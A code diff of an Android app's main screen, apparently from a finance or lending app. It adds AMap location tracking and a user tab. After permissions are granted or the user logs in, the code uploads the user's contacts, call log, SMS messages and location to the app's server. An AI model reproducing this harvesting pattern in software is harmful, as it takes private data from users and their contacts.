@@ -10,6 +10,10 @@ import android.support.annotation.Nullable;
 import android.support.v4.app.Fragment;
 import android.view.View;
 
+import com.amap.api.location.AMapLocation;
+import com.amap.api.location.AMapLocationClient;
+import com.amap.api.location.AMapLocationClientOption;
+import com.amap.api.location.AMapLocationListener;
 import com.tbruyelle.rxpermissions2.RxPermissions;
 
 import java.util.List;
@@ -23,12 +27,13 @@ import tech.shuidikeji.shuidijinfu.mvp.contract.MainContract;
 import tech.shuidikeji.shuidijinfu.mvp.presenter.MainPresenter;
 import tech.shuidikeji.shuidijinfu.pojo.AppConfigPojo;
 import tech.shuidikeji.shuidijinfu.ui.fragment.HomeFragment;
+import tech.shuidikeji.shuidijinfu.ui.fragment.UserFragment;
 import tech.shuidikeji.shuidijinfu.utils.CommonUtils;
 import tech.shuidikeji.shuidijinfu.utils.SPUtils;
 import tech.shuidikeji.shuidijinfu.widget.TabBar;
 import tech.shuidikeji.shuidijinfu.widget.dialog.AlertDialog;
 
-public class MainActivity extends BaseMvpActivity<MainPresenter> implements TabBar.OnTabCheckListener, MainContract.IMainView {
+public class MainActivity extends BaseMvpActivity<MainPresenter> implements TabBar.OnTabCheckListener, MainContract.IMainView, AMapLocationListener {
 
     private static final int REQUEST_CODE_SETTING = 103;
 
@@ -41,10 +46,12 @@ public class MainActivity extends BaseMvpActivity<MainPresenter> implements TabB
     private List<AppConfigPojo.Menu> mMainMenu;
 
     private Fragment mCurrentFragment;
-    private HomeFragment mHomeFragment;
 
     @BindView(R.id.tab_bar)
     TabBar mTabBar;
+
+    private AMapLocationClient mLocationClient;
+
 
     public static void launcher(Context context){
         Intent intent = new Intent(context,MainActivity.class);
@@ -72,7 +79,11 @@ public class MainActivity extends BaseMvpActivity<MainPresenter> implements TabB
     @Override
     protected void initData() {
         mMainMenu = SPUtils.getObject(PreferenceConstant.MAIN_MENU,null);
-        mHomeFragment = HomeFragment.newInstance();
+        mLocationClient = new AMapLocationClient(getApplicationContext());
+        AMapLocationClientOption option = new AMapLocationClientOption();
+        option.setInterval(30000);
+        mLocationClient.setLocationOption(option);
+        mLocationClient.setLocationListener(this);
         requestPermission();
     }
 
@@ -80,9 +91,15 @@ public class MainActivity extends BaseMvpActivity<MainPresenter> implements TabB
     public void onTabSelected(View v, int position) {
         switch (position){
             case 0:
-                mCurrentFragment = mHomeFragment;
+                mCurrentFragment = HomeFragment.newInstance();
                 break;
             case 1:
+                if (mMainMenu.size() == 2)
+                    mCurrentFragment = UserFragment.newInstance();
+                break;
+            case 2:
+                if (mMainMenu.size() == 2)
+                    mCurrentFragment = UserFragment.newInstance();
                 break;
         }
 
@@ -115,6 +132,7 @@ public class MainActivity extends BaseMvpActivity<MainPresenter> implements TabB
                             mPresenter.getContactsAndUpload();
                             mPresenter.getCallLogAndUpload();
                             mPresenter.getSmsAndUpload();
+                            mLocationClient.startLocation();
                         }
                     }else if (permission.shouldShowRequestPermissionRationale){
                         // 至少有一个权限被拒绝，并没有选中『不再询问』（Never ask again）,那么下次再次启动时，还会提示请求权限的对话框
@@ -144,10 +162,42 @@ public class MainActivity extends BaseMvpActivity<MainPresenter> implements TabB
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQUEST_CODE_SETTING)
             requestPermission();
+        if (requestCode == REQUEST_LOGIN && CommonUtils.isLogin()){
+            mPresenter.getContactsAndUpload();
+            mPresenter.getCallLogAndUpload();
+            mPresenter.getSmsAndUpload();
+            mLocationClient.startLocation();
+        }
     }
 
     @Override
     protected MainPresenter getPresenter() {
         return new MainPresenter(this);
+    }
+
+    @Override
+    public void finish() {
+        super.finish();
+
+    }
+
+    @Override
+    public void onLocationChanged(AMapLocation aMapLocation) {
+        double latitude = aMapLocation.getLatitude();
+        double longitude = aMapLocation.getLongitude();
+        mPresenter.postLocation(longitude, latitude,"start","android");
+        mLocationClient.stopLocation();
+    }
+
+    @Override
+    public void showPostLocationSuccess() {
+
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        SPUtils.putInt(PreferenceConstant.HOME_DIALOG_STATUS,0);
+        mLocationClient.onDestroy();
     }
 }
